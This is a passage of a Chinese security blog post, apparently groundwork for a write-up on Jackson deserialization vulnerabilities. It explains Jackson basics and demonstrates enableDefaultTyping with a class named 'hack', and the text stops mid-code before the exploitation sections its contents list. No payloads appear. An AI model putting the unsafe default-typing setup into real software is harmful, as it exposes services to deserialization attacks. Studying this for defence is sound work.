@@ -1,0 +1,1713 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Jackson 基本使用 Jackson 简介 Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象">
+<title>Jackson反序列化</title>
+
+<link rel='canonical' href='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/jackson/'>
+
+<link rel="stylesheet" href="/scss/style.min.4574748025b73b0369492ab661900878369bf003d477e5f5c673ee527faf3df7.css"><meta property='og:title' content="Jackson反序列化">
+<meta property='og:description' content="Jackson 基本使用 Jackson 简介 Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象">
+<meta property='og:url' content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/jackson/'>
+<meta property='og:site_name' content='一个俗人'>
+<meta property='og:type' content='article'><meta property='article:section' content='Java' /><meta property='article:published_time' content='2025-02-19T14:57:07&#43;08:00'/><meta property='article:modified_time' content='2025-02-19T07:24:23&#43;00:00'/><meta property='og:image' content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/jackson/1.jpg' />
+<meta name="twitter:title" content="Jackson反序列化">
+<meta name="twitter:description" content="Jackson 基本使用 Jackson 简介 Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/jackson/1.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu7c49ec7d0c73aa09934b289b1d767e6f_13051_300x0_resize_box_3.png" width="300"
+                            height="302" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🤡</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">一个俗人</a></h1>
+            <h2 class="site-description">welcome two 一个俗人&#39;s 博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/gsygsr/gsygsr.github.io.git'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://gsygsr.github.io/en/" >English</option>
+                                
+                                    <option value="https://gsygsr.github.io/" selected>中文</option>
+                                
+                                    <option value="https://gsygsr.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#jackson-基本使用">Jackson 基本使用</a>
+      <ol>
+        <li><a href="#jackson-简介">Jackson 简介</a></li>
+        <li><a href="#使用-jackson-进行序列化与反序列化">使用 Jackson 进行序列化与反序列化</a></li>
+      </ol>
+    </li>
+    <li><a href="#jackson-对于多态问题的解决--font-stylecolorrgb80-80-92jacksonpolymorphicdeserialization-机制font">Jackson 对于多态问题的解决 —— <font style="color:rgb(80, 80, 92);">JacksonPolymorphicDeserialization 机制</font></a>
+      <ol>
+        <li>
+          <ol>
+            <li><a href="#java_lang_object">JAVA_LANG_OBJECT</a></li>
+            <li><a href="#object_and_non_concrete">OBJECT_AND_NON_CONCRETE</a></li>
+            <li><a href="#non_concrete_and_arrays">NON_CONCRETE_AND_ARRAYS</a></li>
+            <li><a href="#non_final">NON_FINAL</a></li>
+            <li><a href="#小结">小结</a></li>
+          </ol>
+        </li>
+        <li><a href="#jsontypeinfo-注解">@JsonTypeInfo 注解</a>
+          <ol>
+            <li><a href="#jsontypeinfoidnone">JsonTypeInfo.Id.NONE</a></li>
+            <li><a href="#jsontypeinfoidclass">JsonTypeInfo.Id.CLASS</a></li>
+            <li><a href="#jsontypeinfoidminimal_class">JsonTypeInfo.Id.MINIMAL_CLASS</a></li>
+            <li><a href="#jsontypeinfoidname">JsonTypeInfo.Id.NAME</a></li>
+            <li><a href="#jsontypeinfoidcustom">JsonTypeInfo.Id.CUSTOM</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#反序列化中类属性方法的调用">反序列化中类属性方法的调用</a>
+      <ol>
+        <li><a href="#使用-defaulttyping">使用 DefaultTyping</a></li>
+        <li><a href="#使用-jsontypeinfo-注解">使用 @JsonTypeInfo 注解</a></li>
+        <li><a href="#jackson-反序列化调试分析">Jackson 反序列化调试分析</a></li>
+        <li><a href="#结论">结论</a></li>
+      </ol>
+    </li>
+    <li><a href="#jackson-反序列化漏洞">Jackson 反序列化漏洞</a>
+      <ol>
+        <li><a href="#前提条件">前提条件</a></li>
+        <li><a href="#漏洞场景">漏洞场景</a>
+          <ol>
+            <li><a href="#属性不为object类时">属性不为Object类时</a></li>
+            <li><a href="#属性为-object-类时">属性为 Object 类时</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/java/java%E5%AE%89%E5%85%A8/jackson/">
+                <img src="/java/java%E5%AE%89%E5%85%A8/jackson/1_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_800x0_resize_q75_box.jpg"
+                        srcset="/java/java%E5%AE%89%E5%85%A8/jackson/1_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_800x0_resize_q75_box.jpg 800w, /java/java%E5%AE%89%E5%85%A8/jackson/1_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="371" 
+                        loading="lazy"
+                        alt="Featured image of post Jackson反序列化" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="background-color: #2a9d8f; color: #fff;">
+                Java反序列化
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/java/java%E5%AE%89%E5%85%A8/jackson/">Jackson反序列化</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Feb 19, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="jackson-基本使用">Jackson 基本使用
+</h2><h3 id="jackson-简介">Jackson 简介
+</h3><p><font style="color:rgb(80, 80, 92);">Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。</font></p>
+<p><font style="color:rgb(80, 80, 92);">由于其使用简单，速度较快，且不依靠除 JDK 外的其他库，被众多用户所使用。</font></p>
+<h3 id="使用-jackson-进行序列化与反序列化">使用 Jackson 进行序列化与反序列化
+</h3><p>依赖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;dependencies&gt;  
+</span></span><span class="line"><span class="cl">  &lt;dependency&gt;  
+</span></span><span class="line"><span class="cl">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;  
+</span></span><span class="line"><span class="cl">    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;  
+</span></span><span class="line"><span class="cl">    &lt;version&gt;2.7.9&lt;/version&gt;  
+</span></span><span class="line"><span class="cl">  &lt;/dependency&gt;  
+</span></span><span class="line"><span class="cl">  &lt;dependency&gt;  
+</span></span><span class="line"><span class="cl">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;  
+</span></span><span class="line"><span class="cl">    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;  
+</span></span><span class="line"><span class="cl">    &lt;version&gt;2.7.9&lt;/version&gt;  
+</span></span><span class="line"><span class="cl">  &lt;/dependency&gt;  
+</span></span><span class="line"><span class="cl">  &lt;dependency&gt;  
+</span></span><span class="line"><span class="cl">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;  
+</span></span><span class="line"><span class="cl">    &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;  
+</span></span><span class="line"><span class="cl">    &lt;version&gt;2.7.9&lt;/version&gt;  
+</span></span><span class="line"><span class="cl">  &lt;/dependency&gt;  
+</span></span><span class="line"><span class="cl">&lt;/dependencies&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>新建一个Person类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">public class Person {
+</span></span><span class="line"><span class="cl">    public  int age;
+</span></span><span class="line"><span class="cl">    public String name;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    @Override
+</span></span><span class="line"><span class="cl">    public String toString() {
+</span></span><span class="line"><span class="cl">        return String.format(&#34;Person.age=%d, Person.name=%s&#34;, age, name);
+</span></span><span class="line"><span class="cl">    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Test类进行序列化和反序列化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Person person = new Person();
+</span></span><span class="line"><span class="cl">person.age = 20;
+</span></span><span class="line"><span class="cl">person.name = &#34;ygsr&#34;;
+</span></span><span class="line"><span class="cl">ObjectMapper mapper = new ObjectMapper();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">String json = mapper.writeValueAsString(person);
+</span></span><span class="line"><span class="cl">System.out.println(json);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Person person1 = mapper.readValue(json,Person.class);
+</span></span><span class="line"><span class="cl">System.out.println(person1);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>writeValueAsString</code>:将java对象序列化为JSON字符串</li>
+<li><code>readValue</code>: 将 JSON 数据反序列化为 Java 对象的方法</li>
+</ul>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734517194798-adfaf9a9-1896-4447-ba53-8cf185935aa4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h2 id="jackson-对于多态问题的解决--font-stylecolorrgb80-80-92jacksonpolymorphicdeserialization-机制font">Jackson 对于多态问题的解决 —— <font style="color:rgb(80, 80, 92);">JacksonPolymorphicDeserialization 机制</font>
+</h2><p>假设有一个父类和多个子类，JSON 数据中可能会包含不同类型的对象。Jackson 提供了几种方式来支持多态反序列化，其中最常用的是使用 <code>@JsonTypeInfo</code> 和 <code>@JsonSubTypes</code> 注解。 <font style="color:rgb(80, 80, 92);">就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即 </font><code>DefaultTyping</code><font style="color:rgb(80, 80, 92);"> 和 </font><code>@JsonTypeInfo</code><font style="color:rgb(80, 80, 92);"> 注解</font></p>
+<p><font style="color:rgb(80, 80, 92);"></font></p>
+<p><font style="color:rgb(80, 80, 92);">Jackson 提供一个 enableDefaultTyping 设置</font></p>
+<p><font style="color:rgb(80, 80, 92);">包含四个值</font></p>
+<ul>
+<li><font style="color:rgb(80, 80, 92);">JAVA_LANG_OBJECT</font></li>
+<li><font style="color:rgb(80, 80, 92);">OBJECT_AND_NON_CONCRETE</font></li>
+<li><font style="color:rgb(80, 80, 92);">NON_CONCRETE_AND_ARRAYS</font></li>
+<li><font style="color:rgb(80, 80, 92);">NON_FINAL </font></li>
+</ul>
+<h4 id="java_lang_object">JAVA_LANG_OBJECT
+</h4><p><font style="color:rgb(80, 80, 92);">JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个 Object 类型时，会对该 Object 类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个 Object 本身也得是一个可被序列化的类）</font></p>
+<p><font style="color:rgb(80, 80, 92);">新建一个hack类</font></p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734518160306-4912b4d1-fb7f-4673-a828-e14e92e37a93.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>修改Person类,添加Object类型属性</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">public  int age;
+</span></span><span class="line"><span class="cl">public String name;
+</span></span><span class="line"><span class="cl">public Object object;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@Override
+</span></span><span class="line"><span class="cl">public String toString() {
+</span></span><span class="line"><span class="cl">  return String.format(&#34;Person.age=%d, Person.name=%s,%s&#34;, age, name,object == null ? &#34;null&#34; : object);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>新建Test.java,添加<code>enableDefaultTyping()</code><font style="color:rgb(80, 80, 92);"> 并设置为 </font><code>JAVA_LANG_OBJECT</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Person person = new Person();
+</span></span><span class="line"><span class="cl">person.age = 20;
+</span></span><span class="line"><span class="cl">person.name = &#34;ygsr&#34;;
+</span></span><span class="line"><span class="cl">person.object = new hack();
+</span></span><span class="line"><span class="cl">ObjectMapper mapper = new ObjectMapper();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">String json = mapper.writeValueAsString(person);
+</span></span><span class="line"><span class="cl">System.out.println(json);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Person person1 = mapper.readValue(json, Person.class);
+</span></span><span class="line"><span class="cl">System.out.println(person1);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734518639417-d3efd789-7655-444c-8528-6204ec8d4677.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>如果不设置<code>JAVA_LANG_OBJECT</code></p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734518630119-9d853862-2a74-46de-abff-56bd2a93eabe.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>可以发现设置了之后object属性被反序列化了,输出时是直接输出hack对象</p>
+<h4 id="object_and_non_concrete">OBJECT_AND_NON_CONCRETE
+</h4><p><font style="color:rgb(80, 80, 92);">OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有 Interface、AbstractClass 类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。</font></p>
+<p><font style="color:rgb(80, 80, 92);">添加Sex接口</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">public interface Sex {
+</span></span><span class="line"><span class="cl">    public void setSex(int sex);
+</span></span><span class="line"><span class="cl">    public int getSex();
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>新建MySex类继承Sex接口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">public class MySex implements Sex{
+</span></span><span class="line"><span class="cl">    int sex;
+</span></span><span class="line"><span class="cl">    @Override
+</span></span><span class="line"><span class="cl">    public void setSex(int sex) {
+</span></span><span class="line"><span class="cl">        this.sex = sex;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    @Override
+</span></span><span class="line"><span class="cl">    public int getSex() {
+</span></span><span class="line"><span class="cl">        return sex;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改Person类</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">public int age;
+</span></span><span class="line"><span class="cl">    public String name;
+</span></span><span class="line"><span class="cl">    public Object object;
+</span></span><span class="line"><span class="cl">    public Sex sex;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    @Override
+</span></span><span class="line"><span class="cl">    public String toString() {
